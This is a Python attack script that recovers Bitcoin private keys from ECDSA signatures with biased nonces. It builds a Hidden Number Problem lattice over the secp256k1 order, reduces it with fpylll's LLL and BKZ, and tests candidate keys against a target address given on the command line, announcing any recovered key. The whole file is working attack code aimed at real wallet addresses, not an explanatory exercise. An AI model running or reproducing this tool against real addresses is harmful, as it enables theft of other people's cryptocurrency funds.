
import json
import sys
from fpylll import IntegerMatrix, LLL, BKZ
from lattice_nonce_analyzer import verify_key

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def solve_hnp_fpylll(sigs, m):
    N = len(sigs)
    print(f"Constructing lattice with {N} signatures...")
    
    X = P // m
    W = P // X 
    
    matrix = IntegerMatrix(N + 2, N + 2)
    for i in range(N):
        matrix[i, i] = P * W
    for i in range(N):
        matrix[N, i] = (sigs[i][0] * W) % (P * W)
    matrix[N, N] = 1
    for i in range(N):
        matrix[N + 1, i] = (sigs[i][1] * W) % (P * W)
    matrix[N + 1, N + 1] = W 
    
    print("Running LLL...")
    LLL.reduction(matrix)
    
    print("Running BKZ...")
    BKZ.reduction(matrix, BKZ.Param(block_size=20))
    
    return matrix

def attack_modular_bias(address, m, a):
    print(f"Attacking modular bias k = {a} mod {m} for {address}...")
    # Try different filename patterns
    prefixes = [address[:4], address[:6], address[:8], 'bc1q']
    sigs = None
    for p in prefixes:
        try:
            filename = f'sigs_{p}.json'
            sigs = json.load(open(filename))
            print(f"Loaded signatures from {filename}")
            break
        except FileNotFoundError:
            continue
            
    if not sigs:
        print(f"No signatures found for {address}")
        return
        
    print(f"Loaded {len(sigs)} signatures.")
    
    m_inv = pow(m, -1, P)
    
    hnp_sigs = []
    for s in sigs:
        try:
            r = int(s['r'])
            s_val = int(s['s'])
            z = int(s['z'])
        except KeyError:
            # Try hex or other fields
            continue
            
        s_inv = pow(s_val, -1, P)
        ai = (s_inv * z) % P
        bi = (s_inv * r) % P
        
        # q = (bi * m_inv) * d + (ai - a) * m_inv
        ti = (bi * m_inv) % P
        ui = ((ai - a) * m_inv) % P
        hnp_sigs.append((ti, ui))
    
    # Use subset for faster lattice
    subset_n = min(len(hnp_sigs), 90)
    matrix = solve_hnp_fpylll(hnp_sigs[:subset_n], m)
    
    for i in range(matrix.nrows):
        row = matrix[i]
        potential_d = abs(int(row[subset_n]))
        if potential_d > 0 and potential_d < P:
            if verify_key(potential_d, address):
                print(f"!!! SUCCESS !!! Private key found: {hex(potential_d)}")
                return potential_d
        
        potential_d = (P - potential_d) % P
        if potential_d > 0 and verify_key(potential_d, address):
            print(f"!!! SUCCESS !!! Private key found: {hex(potential_d)}")
            return potential_d

    print("Failed to find key.")
    return None

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 solve_modular_bias.py <address> <m> <a>")
    else:
        addr = sys.argv[1]
        m = int(sys.argv[2])
        a = int(sys.argv[3])
        attack_modular_bias(addr, m, a)
